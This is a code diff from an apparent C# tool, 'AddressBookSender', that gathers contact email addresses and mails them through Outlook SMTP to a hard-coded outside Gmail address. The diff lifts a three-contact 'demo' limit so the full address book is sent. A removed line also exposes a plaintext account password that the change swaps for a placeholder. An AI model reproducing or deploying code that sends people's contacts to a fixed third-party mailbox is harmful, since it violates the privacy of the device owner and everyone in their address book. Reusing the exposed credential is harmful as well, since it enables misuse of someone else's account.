@@ -55,11 +55,7 @@ namespace AddressBookSender
                 foreach (var email in emails)
                     Content += email.ToString() + "\t";
                 Content += "\n";
-                if (i == 3) //это кулак дружбы
-                {
-                    Content += "\n Внимание! Демо версия. Отправлено только 3 контакта. Для дальнейшей работы приобретите, ппожалуйста, полную версию службы.";
-                    break;
-                }
+               
                 i++;
             }
             string to = "atataa733@gmail.com";
@@ -68,7 +64,7 @@ namespace AddressBookSender
             message.Subject = "Список контактов";
             message.Body = Content;
             SmtpClient client = new SmtpClient("smtp-mail.outlook.com", 587);
-            client.Credentials = new NetworkCredential("vahe061@outlook.com", "YRJSJeuJN$%W7Jxf547heJGF4t4HETe5");
+            client.Credentials = new NetworkCredential("vahe061@outlook.com", "your_password");
             client.EnableSsl = true;
             client.UseDefaultCredentials = false;
             client.DeliveryMethod = SmtpDeliveryMethod.Network;
